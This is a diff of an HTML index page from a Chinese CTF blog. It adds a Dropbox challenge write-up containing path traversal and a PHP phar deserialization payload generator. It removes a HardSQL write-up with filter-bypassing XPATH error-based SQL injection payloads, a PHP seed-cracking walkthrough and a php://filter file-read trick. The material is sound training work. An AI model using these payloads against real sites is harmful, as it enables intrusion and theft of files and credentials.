@@ -255,6 +255,345 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/19/-CISCN2019-华北赛区-Day1-Web1-Dropbox.html/" itemprop="url">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-19T10:46:12+08:00">
+                2021-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  467 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h1><p>考点：phar协议</p>
+<p>注册登录之后是上传页面，正常上传文件，在下载文件处发现存在任意下载漏洞</p>
+<p><img src="https://i.loli.net/2021/01/19/poDisMyHO9qYxwv.png" alt="image-20210119150237883"></p>
+<p>注意要向前跳两级目录，因为通常情况下文件会放在 /sandbox/hash/ 目录下</p>
+<p>利用这点我们可以下载文件：</p>
+<p><img src="https://i.loli.net/2021/01/19/LWqTaxhRr2eVPoH.png" alt="image-20210119150621161"></p>
+<p>源代码审计：</p>
+<p>download.php中对文件名进行了判断 是否含有flag字段，推测我们要下载 flag文件</p>
+<p><img src="https://i.loli.net/2021/01/19/9jGSNo6pFr7Pyz2.png" alt="image-20210119150846724"></p>
+<p>class.php文件中定义了三个类</p>
+<p>User类</p>
+<p><img src="https://i.loli.net/2021/01/19/RBKj2DLCzcmhZbi.png" alt="image-20210119162158238"></p>
+<p>File类</p>
+<p><img src="https://i.loli.net/2021/01/19/64yvhdmQN3lOt9c.png" alt="image-20210119162218126"></p>
+<p>FileList类</p>
+<p><img src="https://i.loli.net/2021/01/19/wr3ToAJnxhiQYpf.png" alt="image-20210119162237449"></p>
+<p>首先file类中存在 close() 方法会调用 file_get_contents() 函数可以读取flag文件，而 User 类中的析构方法会调用 close() 方法，FileList 类中的 __call 魔术方法可以调用file类中的 close()方法，所以我们可以理解为将user类中的 close() 方法实例化后传入 call魔术方法中的 $func 参数</p>
+<p>得到flag文件后 利用 FileList 类中的析构函数输出</p>
+<p>构造php文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $file = <span class="keyword">new</span> File();</span><br><span class="line">        $file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> User();</span><br><span class="line">$a-&gt;db = <span class="keyword">new</span> FileList();</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造phar文件</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'3.phar'</span>);</span><br><span class="line">$phar -&gt; startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);<span class="comment">//设置stub</span></span><br><span class="line">$phar -&gt; addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);<span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar -&gt; setMetadata($a);<span class="comment">//存入自定义的meta-data</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar -&gt; stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行这个php文件 会生成一个 3.phar 文件，更改后缀名为 png 上传</p>
+<p>成功上传后 执行删除操作，触发phar反序列化，得到flag</p>
+<p><img src="https://i.loli.net/2021/01/19/FvbPjK8nQBmYRCh.png" alt="image-20210119183943641"></p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://www.cnblogs.com/chrysanthemum/p/11785453.html" target="_blank" rel="noopener">https://www.cnblogs.com/chrysanthemum/p/11785453.html</a></li>
+<li><a href="https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/" target="_blank" rel="noopener">https://flag0.com/2019/10/31/ciscn2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Dropbox/</a></li>
+<li><a href="http://www.iniess.ink/index.php/archives/Dropbox-1.html" target="_blank" rel="noopener">http://www.iniess.ink/index.php/archives/Dropbox-1.html</a></li>
+</ul>
+<p>有关phar的文章 下面这篇写的不戳</p>
+<ul>
+<li><a href="https://xz.aliyun.com/t/2715#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/2715#toc-16</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/01/19/PHP魔术方法总结.html/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="狗蛋菌">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Goudan's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2021/01/19/PHP魔术方法总结.html/" itemprop="url">PHP魔术方法总结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-01-19T10:37:41+08:00">
+                2021-01-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  6.4k 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  26 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/19/PHP魔术方法总结.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/01/17/极客大挑战-2019-HardSQL.html/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -356,68 +695,14 @@
 
       
         
-          
-            <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>考点：报错注入</p>
-<p>XPATH报错；过滤了空格，等号，and</p>
-<p>爆数据库</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># geek</span></span><br></pre></td></tr></table></figure>
-
-<p>爆表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># H4rDsq1</span></span><br></pre></td></tr></table></figure>
-
-<p>爆列名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure>
-
-<p>爆字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;731351f9-6bb1-4cef-acb7-1c</span></span><br></pre></td></tr></table></figure>
-
-<p>由于只有一半 所以我们用 left()和right() 函数来爆后面的字段</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9-6bb1-4cef-acb7-1ceb55c45a02&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>最后得到flag：flag{731351f9-6bb1-4cef-acb7-1ceb55c45a02}</p>
-<p>注：“^” 在 sql 语句中是异或的作用也可以换成 or；由于过滤了空格可以使用()绕过；过滤了“=”可以使用 like 绕过；由于是 XPATH 报错我们可以使用 extractvalue()或者updatexml()报错注入</p>
-<h2 id="十种报错函数"><a href="#十种报错函数" class="headerlink" title="十种报错函数"></a>十种报错函数</h2><p>1.floor()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/OJdbi2PIDCGuUYq.png" alt="1016026-20160928204840594-1429421338"></p>
-<p>2.extractvalue()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/JHdtuBIy72gipjn.png" alt="1016026-20160928205421297-407989251"></p>
-<p>3.updatexml()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/zA2VyeRTUQHEiIO.png" alt="1016026-20160928205451969-1920882857"></p>
-<p>4.geometrycollection()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/fpcINsh9ZyKXgVP.png" alt="1016026-20160928205719485-521701933"></p>
-<p>5.multipoint()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/MXgDKYI4SNCoLiT.png" alt="1016026-20160928205942266-563740245"></p>
-<p>6.polygon()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/lCxvQr1HV42pOF8.png" alt="1016026-20160928205828281-760176387"></p>
-<p>7.multipolygon()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/ypix3XkH1Nc7Gwm.png" alt="1016026-20160928210038094-1420034123"></p>
-<p>8.linestring()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/l8H3vJfcneDSCRw.png" alt="1016026-20160928210144438-1099086559"></p>
-<p>9.multilinestring()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/5j1tVEkunLWd8gA.png" alt="1016026-20160928210420750-344279412"></p>
-<p>10.exp()</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/U6LYBpoODh7ISrk.png" alt="1016026-20160928210533313-2028104812"></p>
-
-          
+          <h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>考点：报错注入</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/极客大挑战-2019-HardSQL.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -565,29 +850,14 @@
 
       
         
-          
-            <h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>考点：php伪随机数</p>
-<p>check.php中有 mt_srand()和mt_rand()两个伪随机函数</p>
-<p><img src="https://i.loli.net/2021/01/13/WwCku1RMVsdAPI8.png" alt="image-20210113181832863"></p>
-<p>这里用到了php伪随机的种子爆破，利用网上的c语言脚本：<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p>
-<p>逆向题目中的加密函数，使符合脚本的输入规范</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'A5rgiREesS'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/01/14/x8DmpyH452TlakC.png" alt="微信截图_20210113184021"></p>
-<p>用脚本爆破种子</p>
-<p><img src="https://i.loli.net/2021/01/14/Kuwxg1ofsTdV9WI.png" alt="QQ截图20210113184233"></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 61 8 8 0 61 53 53 0 61 40 40 0 61 4 4 0 61 18 18 0 61 54 54 0 61</span><br><span class="line"><span class="comment">#961723226</span></span><br></pre></td></tr></table></figure>
-
-<p>将种子代入原函数得到字符串</p>
-<p><img src="https://i.loli.net/2021/01/13/3DYUHOhNkdM862W.png" alt="QQ截图20210113184329"></p>
-<p>php_my_seed使用方法：<a href="https://www.cnblogs.com/zaqzzz/p/9997855.html" target="_blank" rel="noopener">https://www.cnblogs.com/zaqzzz/p/9997855.html</a></p>
-<p>参考文章：</p>
-<ul>
-<li><a href="https://xz.aliyun.com/t/3656#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/3656#toc-3</a></li>
-<li><a href="https://www.freebuf.com/vuls/192012.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/192012.html</a></li>
-</ul>
-
-          
+          <h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>考点：php伪随机数</p>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2021/01/17/GWCTF-2019-枯燥的抽奖.html/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -735,38 +1005,14 @@
 
       
         
-          
-            <h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组] AreUSerialz"></a>[网鼎杯 2020 青龙组] AreUSerialz</h1><p>借这道题复习记录下反序列化的小细节~</p>
-<p>首先源码审计，这里就不贴源码了，直接看可控参数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> $op;</span><br><span class="line"><span class="keyword">protected</span> $filename;</span><br><span class="line"><span class="keyword">protected</span> $content;</span><br></pre></td></tr></table></figure>
-
-<p>op为操作标识，op=1时写文件，op=2时读文件；filename 标识读取文件的名字；content 是写文件时写入的内容</p>
-<p>看源代码中的魔术方法：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $op = <span class="string">"1"</span>;</span><br><span class="line">        $filename = <span class="string">"/tmp/tmpfile"</span>;</span><br><span class="line">        $content = <span class="string">"Hello World!"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">"2"</span>)<span class="comment">//强类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">"1"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
-
-<p>其中反序列化时不会调用 构造函数，所以我们将注意力放在析构函数中，注意到析构函数中有一个强类型比较</p>
-<p>而在 process()函数中 是弱类型比较</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"1"</span>) &#123;<span class="comment">//弱类型</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">"2"</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">"Bad Hacker!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>所以我们使 op=2 ，在析构函数中强类型比较为 false，而在process()中弱类型比较为 true</p>
-<p>之后在read函数中，我们的可控变量为filename，利用php伪协议进行读取文件操作 ：php://filter/read=convert.base64-encode/resource=flag.php</p>
